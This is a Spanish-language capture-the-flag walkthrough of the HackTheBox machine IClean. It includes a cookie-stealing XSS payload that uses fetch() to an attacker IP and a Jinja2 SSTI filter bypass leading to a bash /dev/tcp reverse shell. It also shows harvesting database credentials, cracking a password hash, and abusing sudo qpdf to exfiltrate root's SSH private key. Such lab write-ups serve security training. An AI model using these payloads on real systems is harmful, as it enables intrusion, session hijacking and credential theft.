# Tutorial de IClean de HackTheBox en Español

![card](../../img/IClean/IClean.png)

Empezamos la máquina lanzando un escaneo de todo el rango de puertos TCP.
```
nmap -p- -sS -n -Pn --min-rate 5000 10.129.189.64

Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-20 20:22 CEST
Nmap scan report for 10.129.189.64
Host is up (0.080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.26 seconds 
```

Vemos que están abiertos los puertos 22 y 80, que normalmente corresponden con los servicios SSH y HTTP. Vamos a comprobarlo con un escaneo a fondo de ambos.
```
nmap -p 22,80 -sVC --min-rate 5000 10.129.189.64

Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-20 20:27 CEST
Nmap scan report for 10.129.189.64
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2cf90777e3f13a36dbf23b94e3b7cfb2 (ECDSA)
|_  256 4a919ff274c04181524df1ff2d01786b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

En el puerto 80 nos reporta que estamos ante una maquina linux (Ubuntu) con un servidor apache, información que podría sernos útil en el futuro.

Dado que en el puerto 80 está corriendo el servicio HTTP, vamos a ejecutar el script `whatweb` para detectar las tecnologías que está empleando.

```
whatweb 10.129.189.64

http://10.129.189.64 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.189.64], Meta-Refresh-Redirect[http://capiclean.htb]
ERROR Opening: http://capiclean.htb - no address for capiclean.htb
```

Nos da un error porque intenta redireccionar al dominio `http://capiclean.htb` y no lo encuentra. Para que nuestra máquina asocie este dominio a la ip `10.129.189.64`, debemos de incluir la linea `10.129.189.64 capiclean.htb` al archivo `/etc/hosts`.

```
echo "10.129.189.64 capiclean.htb" >> /etc/hosts
```

Una vez hecho podemos volver a ejecutar el script.

```
whatweb 10.129.189.64

http://10.129.189.64 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.189.64], Meta-Refresh-Redirect[http://capiclean.htb]
http://capiclean.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], IP[10.129.189.64], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], Werkzeug[2.3.7], X-UA-Compatible[IE=edge]
```

Entre otras cosas descubrimos que la página emplea python, informacion que puede ser crucial de cara a, por ejemplo, alguna inyección de codigo.

A continuación, vamos a realizar un descubrimiento de rutas con el diccionario `directory-list-2.3-medium.txt` de [SecLists](https://github.com/danielmiessler/SecLists).

```
wfuzz -c -u http://capiclean.htb/FUZZ -w ~delo/Hacking/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 -t 50

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://capiclean.htb/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000039:   200        87 L     159 W      2106 Ch     "login"
000000012:   200        129 L    355 W      5267 Ch     "about"
000000068:   200        192 L    579 W      8592 Ch     "services"
000000594:   200        182 L    564 W      8109 Ch     "team"
000000812:   200        89 L     181 W      2237 Ch     "quote"
000001211:   302        5 L      22 W       189 Ch      "logout"
000002913:   302        5 L      22 W       189 Ch      "dashboard"
000004613:   200        153 L    399 W      6084 Ch     "choose"

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 215.6359
Processed Requests: 65646
Filtered Requests: 65637
Requests/sec.: 304.4298
```

De entre estas rutas la que parece mas interesante es `dashboard`, pero al entrar en ella somos redirigidos a la ruta raìz, por lo que podemos intuir que no tenemos los suficientes permisos para acceder. Aún así, nos anotamos esta ruta para el futuro.

Ya habiendo hecho un reconocimiento basico podemos entrar en la página desde el navegador y examinarla exhaustivamente.

![web first impression](../../img/IClean/web.png)

Bajando un poco vemos un boton `GET A QUOTE`.

![get a quote button](../../img/IClean/get-a-quote-button.png)

Dentro vemos un formulario, vamos a rellenarlo para ver como reacciona la página.

![quote form](../../img/IClean/quote-form.png)

Al enviarlo nos dice que nuestra solicitud va a ser revisada por un equipo, lo que es potencialmente vulnerable a XSS.

![your quote request was sent to our management teem...](../../img/IClean/quote-thank-you.png)

Para comprobar si es vulnerable vamos a interceptar la petición por burpsuite y a manipularla en el repeater.

Vemos que hay un campo email y varios campos services dependiendo de los servicios que hayamos elegido. Podemos intentar introducir una etiqueta HTML maliciosa e intentar robarle las cookies de sesión al equipo que va a revisar nuestra solicitud.

![xss through burpsuite](../../img/IClean/xss-payload.png)

El payload que se ve arriba es el siguiente, pero, para mandarlo como un campo POST es necesario URL-encodearlo, para ello selecciónalo en burpsuite y pulsa `ctrl`+`u`.

```html
<img src="err" onerror="fetch(`http://10.10.14.124:1234/?${document.cookie}`)" />
```

---

**¿Qué hace este payload?**

*Suponiendo que los campos `service` y `email` se le mostrarán al destinatario en un navegador, si estos no están bien sanitizados, una etiqueta HTML podria interpretarse en vez de leerse en texto claro.*

*Ahí es donde entra nuestro payload. El navegador intentará cargar una etiqueta `<img />` cuya url es "err", lo cual dará un error ya que no existe ninguna imagen llamada "err" en el directorio actual de la máquina (esperemos).*

*Al dar error se ejecutará el `onerror` de la etiqueta, donde nos mandaremos una solicitud por get a nuestra maquina con las cookies de la víctima como parámetros. Luego nosotros las recibiremos y nos intentaremos conectar como ese usuario.*

---

Para leer la petición que nos va a ser mandada por el puerto 1234 utilizamos netcat.

```
nc -lnvtp 1234

listening on [any] 1234 ...
connect to [10.10.14.124] from (UNKNOWN) [10.129.189.64] 33942

GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zu26Vg.RFsVfRjFbg5CykH8zdKH9fGez7M HTTP/1.1
Host: 10.10.14.124:1234
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Tras esperar unos segundos, nos llega la solicitud con una cookie de sesión `session`.

Ahora podemos incorporar esta cookie en nuestro navegador e intentar acceder a alguna ruta a la que previamente tuvieramos el acceso restringido, como por ejemplo el `dashboard` que habíamos encontrado antes.

Para ello abrimos el panel de desarrolladores con `f12`, nos dirigimos a la pestaña "Almacenamiento" en Firefox o "Aplicación" en Chrome, abrimos "Cookies" y añadimos la cookie de nombre `session`.

![save cookie](../../img/IClean/save-cookie.png)

Con la nueva cookie de sesión ya podemos entrar al `dashboard`.

![dashboard](../../img/IClean/dasahboard.png)

Investigando todos los enlaces del `dashboard` nos topamos con `Generate QR`, en el que nos piden un id de una factura, para ello vamos a `Generate Invoice` y generamos uno de prueba.

![generate invoice](../../img/IClean/generate-invoice.png)

Copiamos el ID generado.

![invoice id](../../img/IClean/invoice-id.png)

Pegamos el ID en `Generate QR`.

![generate qr](../../img/IClean/genrate-qr.png)

Y pegamos el link del QR recién generado.

![insert qr](../../img/IClean/insert-qr.png)

Vemos que se nos ha generado una factura con un codigo QR proveniente del link anterior.

![invoice](../../img/IClean/invoice.png)

Es muy probable que nuestro input vaya a ser introducido en una plantilla de jinja2 o similar para crear esta factura. Esto lo hace potencialmente vulnerable a SSTI.

Vamos a volver a darle a `submit` e intercceptar la petición por burpsuite. Pondremos el payload `qr_link={{11*11}}`. Para probar si es vulnerable.

---

**¿Qué es {{11*11}}?**

*Como sabemos que la página interpreta python, podemos suponer que utiliza un motor de plantillas como Jinja2. Este tipop de motores utiliza una sintaxis como {{expresión}} o parecido para meter codigo Python dentro del HTML.*

*Entonces, para comprobar que lo de dentro de las llaves se está ejecutando, si ponemos `{{11\*11}}`, tendria que poner 121 en el HTML*

---

![stti test](../../img/IClean/burpsuite-ssti-test.png)

Si buscamos el resultado (121) en la respuesta vemos que se refleja en el src de la `img` del QR. El campo `qr_link` es vulnerable a STTI.

![stti test response](../../img/IClean/stti-test-response.png)

Para ejecutar código a traves del SSTI, necesitamos acceder a la subclase "Popen". Para ello, tenemos que saber que numero de subclase es. Para ver todas las subclases tenemos que ejecutar `().__class__.__base__.__subclasses__()`. Sin embargo, al enviarla salta un `500 INTERNAL SERVER ERROR`. Esto puede deberse a que las `_` estén prohibidas por seguridad.

![ssti error](../../img/IClean/ssti-error.png)

Buscando en Google maneras de bypassear el filtro de las `_`, nos topamos con este articulo: [jinja2 ssti filter bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) en el que encontramos la manera de ejecutarlo igualmente.

Los campos post finales con el bypass nos quedan de la siguiente manera:

```
invoice_id=&form_type=scannable_invoice&class=__class__&base=__base__&subclasses=__subclasses__&qr_link={{()|attr(request.form.get('class'))|attr(request.form.get('base'))|attr(request.form.get('subclasses'))()}}
```

![subclasses-payload](../../img/IClean/subclasses-payload.png)

En la respuesta copiamos todas las subclases (lo que hay entre corchetes dentro del src de la imagen) y las pegamos en un archivo llamado `subclasses.txt`.

Una vez hecho, ejecutamos el siguiente script para sacar la posición de `Popen` en la lista de subuclases.

```
echo $(($(cat subclasses.txt | tr -d '[]' | tr ',' "\n" | grep -n Popen | awk '{ print $1 }' | tr -d ':') - 1))

365
```

Ya que sabemos que su número es el `365`, podemos ejecutar comandos con `().__class__.__base__.__subclasses__().__getitem__(365)('COMANDO',shell=True,stdout=-1).communicate()`.

Vamos a comprobar que tenemos un RCE mandandonos una reverse shell `bash -c "bash -i >& /dev/tcp/10.10.14.124/1234 0>&1"`, esto con el bypass quedaría así.

```
invoice_id=&form_type=scannable_invoice&class=__class__&base=__base__&subclasses=__subclasses__&getitem=__getitem__&qr_link={{(()|attr(request.form.get('class'))|attr(request.form.get('base'))|attr(request.form.get('subclasses'))()|attr(request.form.get('getitem'))(365)('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.124/1234+0>%261"',shell=True,stdout=-1)).communicate()}}
```

Escuchamos con netcat para recibir la reverse shell por el puerto `1234`.

```
nc -lnvtp 1234
```

Una vez dentro miramos que usuarios hay con terminal en la máquina víctima con el siguiente comando.

```
cat /etc/passwd | grep -e "sh$"

root:x:0:0:root:/root:/bin/bash
consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
```

Nos apuntamos el nombre de `consuela` por si nos sirve en el futuro.

Vemos que estamos en el directorio `/opt/app`, en el que encontramos un archivo `app.py`, vamos a examinarlo en busca de las credenciales de la base de datos.

```
cat app.py

...contenido del archivo...
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
...contenido del archivo...
```

Vamos a conectarnos a la base de datos con estas credenciales.

```
mysql -h 127.0.0.1 -u iclean -D capiclean -p

Enter password: pxCsmnGLckUb
```

Mostramos las tablas.

```
show tables;

+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
```

Mostramos todo el contenido de la tabla `users` en busca de usuarios y contraseñas que podamos utilizar para escalar privilegios.

```
select * from users;

+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
```

Nos damos cuenta de que hay un usuario llamado `consuela` con una contraseña hasheada. Podemos intentar crackearla con fuerza bruta o comprobar si ya ha sido crackeada previamente en una plataforma como [crackstation](https://crackstation.net/).

![crackstation](../../img/IClean/crackstation-password.png)

Efectivamente, la contraseña está contemplada en la base de datos de crackstation. Podemos intentar loguearnos como `consuela` en la máquina con la contraseña que acabamos de sacar.

```
su consuela

Password: simple and clean
```

La contraseña es correcta. Ya como `consuela` tenemos acceso al `user.txt`

```
cd
cat user.txt
```

Para intentar escalar privilegios, empezamos viendo que comandos podemos ejecutar como root mediante `sudo`.

```
sudo -l

Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

Podemos ejecutar `qpdf` como root, por lo que vamos a leer la ayuda del comando en busca de algúna opción que nos permita convertirnos en root.

```
sudo qpdf --help

Run "qpdf --help=topic" for help on a topic.
Run "qpdf --help=--option" for help on an option.
Run "qpdf --help=all" to see all available help.

Topics:
  add-attachment: attach (embed) files
  advanced-control: tweak qpdf's behavior
  attachments: work with embedded files
  completion: shell completion
  copy-attachments: copy attachments from another file
  encryption: create encrypted files
  exit-status: meanings of qpdf's exit codes
  general: general options
  help: information about qpdf
  inspection: inspect PDF files
  json: JSON output for PDF information
  modification: change parts of the PDF
  overlay-underlay: overlay/underlay pages from other files
  page-ranges: page range syntax
  page-selection: select pages from one or more files
  pdf-dates: PDF date format
  testing: options for testing or debugging
  transformation: make structural PDF changes
  usage: basic invocation
```

Hay una opción que nos llama la atención especialmente: `add-attachment`. Podemos adjuntar la clave privada de ssh del usuario root.

Primero debemos indagar en la ayuda del parámetro `add-attachment` para usarlo correctamente.

```
sudo qpdf --help=add-attachment

The options listed below appear between --add-attachment and its
terminating "--".

Related options:
  --creationdate: set attachment's creation date
  --description: set attachment's description
  --filename: set attachment's displayed filename
  --key: specify attachment key
  --mimetype: attachment mime type, e.g. application/pdf
  --moddate: set attachment's modification date
  --replace: replace attachment with same key

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

Para empezar vamos a descargarnos un PDF de prueba a nustra máquina local y a iniciar un servidor en python para transferirla a la máquina víctima.

```
wget https://pdfobject.com/pdf/sample.pdf
python3 -m http.server 80
```

En la máquina víctima nos descargamos este PDF a una carpeta en `/tmp`.

```
mkdir /tmp/.delo
cd !$
wget http://10.10.14.124/sample.pdf
```

Ahora podemos adjuntar el archivo `/root/.ssh/id_rsa` al PDF.

```
sudo qpdf sample.pdf --add-attachment /root/.ssh/id_rsa -- root-id_rsa.pdf
```

Ya tenemos el archivo `root-id_rsa.pdf`, solo falta ver la manera de leerlo y utilizarlo para autenticarnos como root.

```
sudo qpdf --help=attachments

It is possible to list, add, or delete embedded files (also known
as attachments) and to copy attachments from other files. See help
on individual options for details. Run qpdf --help=add-attachment
for additional details about adding attachments. See also
--help=--list-attachments and --help=--show-attachment.

Related options:
  --add-attachment: start add attachment options
  --copy-attachments-from: start copy attachment options
  --remove-attachment: remove an embedded file

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

Profundizamos en la ayuda del parámetro `--show-attachment`.

```
sudo qpdf --help=--show-attachment

--show-attachment=key

Write the contents of the specified attachment to standard
output as binary data. Get the key with --list-attachments.

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

Listamos las `keys` de los archivos adjuntos y descubrimos que no es mas que el nombre del archivo adjunto.

```
sudo qpdf --list-attachments root-id_rsa.pdf

id_rsa -> 7,0
```

```
sudo qpdf --show-attachment=id_rsa root-id_rsa.pdf

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Añadimos esta clave privada a un archivo en nuestra máquina local de nombre `root-id_rsa`, le damos los permisos adecuados para poder utilizarlo como fichero de identidad y nos conectamos a la máquina por ssh como root.

```
nano root-id_rsa
chmod 600 root-id_rsa
ssh root@10.129.189.64 -i root-id_rsa
```

La autenticación es exitosa, solo nos queda leer el `root.txt` y habremos completado la máquina.

```
cd
cat root.txt
```

Tras acabar la máquina no olvides eliminar la línea del `/etc/hosts` correspondiente a la máquina para evitar que se acumulen líneas con cada máquina que hagas.

Si te ha parecido útil, considera dejar una estrella al proyecto. Gracias y mucha suerte en tus próximas máquinas ❤️.